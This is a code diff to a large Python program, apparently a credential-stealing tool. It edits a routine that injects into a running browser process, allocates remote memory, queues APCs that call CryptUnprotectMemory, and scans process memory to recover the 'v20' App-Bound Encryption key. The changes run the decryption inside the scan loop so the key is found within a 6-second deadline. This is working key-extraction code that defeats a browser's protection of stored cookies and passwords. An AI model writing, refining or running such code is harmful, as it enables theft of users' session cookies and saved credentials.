@@ -3730,7 +3730,9 @@ class _RemoteUnprotect:
         unprotect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptUnprotectMemory")
         protect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptProtectMemory")
         nt_test_alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
-        data = k32.VirtualAllocEx(handle, None, 64, 0x3000, 0x04)
+        data = k32.VirtualAllocEx(handle, None, 32, 0x3000, 0x04)
+        if not data:
+            data = k32.VirtualAllocEx(handle, None, 64, 0x3000, 0x04)
         if not unprotect_fn or not data:
             k32.CloseHandle(handle)
             return
@@ -3976,7 +3978,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         if not unprotect_ok:
             return ";apc:setup"
         if apc_queued == 0:
-            return f";apc:hr{apc_status & 0xFFFFFFFF:x}" if apc_status else ";apc:setup"
+            return f";apc:hr{apc_status & 0xFFFFFFFF:x}" if apc_status else ";apc:0"
         if apc_changed == 0:
             return ";apc:0"
         return ";apc:ok"
@@ -4003,11 +4005,10 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         if extra and extra not in blobs:
             blobs.append(extra)
         for blob in blobs:
-            if len(blob) not in {32, 48, 64}:
-                if len(blob) >= 32:
-                    blob = blob[:32]
-                else:
-                    continue
+            if len(blob) >= 32:
+                blob = blob[:32]
+            else:
+                continue
             plain = unprotect.unprotect(blob)
             if _v20_key_ok(plain, v20_sample, all_blobs=True):
                 return next(
@@ -4043,8 +4044,6 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         unprotect = _RemoteUnprotect(pid)
         if unprotect.ok:
             unprotect_ok += 1
-        keyring_pending: list[tuple[int, bytes, bytes]] = []
-        generic_pending: list[tuple[int, bytes, bytes]] = []
         try:
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
@@ -4083,20 +4082,22 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                         data = bytes(raw[: int(got.value)])
                         scanned += len(data)
                         seen_ptr: set[int] = set()
-                        def take_blob(ptr: int, want: int) -> tuple[bytes, bytes] | None:
+
+                        def take_blob(ptr: int) -> tuple[bytes, bytes] | None:
                             blob = readn(handle, ptr, 32)
                             if not blob:
                                 return None
                             extra = readn(handle, ptr, 64) or blob
                             return blob, extra
 
+                        # In-scan APC (f980476): do not defer past the 6s deadline.
                         for ptr in _keyring_v20_key_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
                             seen_ptr.add(ptr)
                             if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
-                            got_blob = take_blob(ptr, 32)
+                            got_blob = take_blob(ptr)
                             if not got_blob:
                                 continue
                             blob, extra = got_blob
@@ -4105,14 +4106,16 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                                 hit = consider_raw(cand)
                                 if hit:
                                     return hit, "ok"
-                            keyring_pending.append((ptr, blob, extra))
+                            hit = consider_apc(blob, unprotect, ptr, extra)
+                            if hit:
+                                return hit, "ok"
                         for ptr, nbytes in _extract_abe_candidate_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
                             seen_ptr.add(ptr)
                             if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
-                            got_blob = take_blob(ptr, nbytes)
+                            got_blob = take_blob(ptr)
                             if not got_blob:
                                 continue
                             blob, extra = got_blob
@@ -4121,18 +4124,13 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                                 hit = consider_raw(cand)
                                 if hit:
                                     return hit, "ok"
-                            generic_pending.append((ptr, blob, extra))
+                            hit = consider_apc(blob, unprotect, ptr, extra)
+                            if hit:
+                                return hit, "ok"
                 nxt = addr + size
                 if nxt <= addr:
                     break
                 addr = nxt
-            # APC pass: KeyRing first, then generic. Feed every plain into v20 unwrap.
-            for ptr, blob, extra in keyring_pending + generic_pending:
-                if time.monotonic() > deadline:
-                    break
-                hit = consider_apc(blob, unprotect, ptr, extra)
-                if hit:
-                    return hit, "ok"
         finally:
             apc_changed += int(unprotect.changed)
             apc_queued += int(unprotect.queued)
